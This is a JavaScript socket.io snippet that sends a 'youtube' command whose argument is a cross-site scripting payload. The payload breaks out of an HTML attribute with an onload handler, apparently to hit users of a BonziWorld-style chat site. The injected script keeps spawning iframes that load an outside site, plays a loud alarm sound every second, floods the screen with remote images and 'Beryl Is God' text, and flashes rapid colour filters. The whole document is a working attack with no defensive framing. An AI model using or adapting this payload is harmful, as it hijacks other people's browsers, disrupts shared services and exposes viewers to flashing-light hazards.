socket.emit('command', {
  list: [
    'youtube',
    `eee" onload="(function() {
      function r(n, x) {
        return Math.random() * (x - n) + n;
      }

      let imgs = [
        'https://file.garden/aKs2vrhOyTZmaCM9/Bonziworld%20haxxor%20leet/Funny1.jpg',
        'https://media.tenor.com/OmtxZPGE1LYAAAAM/ritz-balls-cobson.gif',
        'https://bud4u.com/wp-content/uploads/2022/01/Faygo-Redpop-24oz-397x1024.png',
        'https://upload.wikimedia.org/wikipedia/commons/f/fa/Nickelodeon_logo_2009.png',
        'https://media.tenor.com/u3dLUw27bKsAAAAe/brimstone-hazardous.png'
      ];

      // Floating iframes
      setInterval(() => {
        let f = document.createElement('iframe');
        f.src = 'https://bonziworldberylicarus.onrender.com';
        f.style.position = 'fixed';
        f.style.left = r(0, innerWidth) + 'px';
        f.style.top = r(0, innerHeight) + 'px';
        f.style.width = '200px';
        f.style.height = '150px';
        f.style.border = '5px solid hsl(' + r(0, 360) + ',100%,50%)';
        f.style.zIndex = 9999;
        document.body.appendChild(f);

        let dx = r(-5, 5);
        let dy = r(-5, 5);
        setInterval(() => {
          let x = parseFloat(f.style.left);
          let y = parseFloat(f.style.top);
          x += dx;
          y += dy;
          if (x < 0 || x + 200 > innerWidth) dx *= -1;
          if (y < 0 || y + 150 > innerHeight) dy *= -1;
          f.style.left = x + 'px';
          f.style.top = y + 'px';
        }, 30);
      }, 1000);

      // Flying text
      setInterval(() => {
        let t = document.createElement('div');
        t.innerText = 'Beryl Is God';
        t.style.position = 'fixed';
        t.style.left = r(0, innerWidth) + 'px';
        t.style.top = r(0, innerHeight) + 'px';
        t.style.fontSize = r(20, 60) + 'px';
        t.style.fontWeight = 'bold';
        t.style.color = 'hsl(' + r(0, 360) + ',100%,50%)';
        t.style.zIndex = 9999;
        document.body.appendChild(t);

        setInterval(() => {
          t.style.left = r(0, innerWidth) + 'px';
          t.style.top = r(0, innerHeight) + 'px';
        }, 500);
      }, 500);

//play the sound, no delay
let a = new Audio('https://file.garden/aKs2vrhOyTZmaCM9/argh.wav');
        a.volume = 1;
        a.play();
        
      // Random images
      setInterval(() => {
        let i = document.createElement('img');
        i.src = imgs[Math.floor(Math.random() * imgs.length)];
        i.style.position = 'fixed';
        i.style.left = r(0, innerWidth) + 'px';
        i.style.top = r(0, innerHeight) + 'px';
        i.style.width = '100px';
        i.style.zIndex = 9999;
        document.body.appendChild(i);

        setInterval(() => {
          i.style.left = r(0, innerWidth) + 'px';
          i.style.top = r(0, innerHeight) + 'px';
        }, 400);
      }, 800);

      // Screen effects
      setInterval(() => {
        document.body.style.filter = 'hue-rotate(' + r(0, 360) + 'deg) saturate(500%)';
      }, 100);

      // Background color randomizer
      setInterval(() => {
        let c = document.getElementById('content');
        if (c) c.style.backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
      }, 200);

      // Alarm sound
      setInterval(() => {
        let a = new Audio('https://file.garden/aKs2vrhOyTZmaCM9/argh.wav');
        a.volume = 1;
        a.play();
      }, 1000);
    })()"`
  ]
});
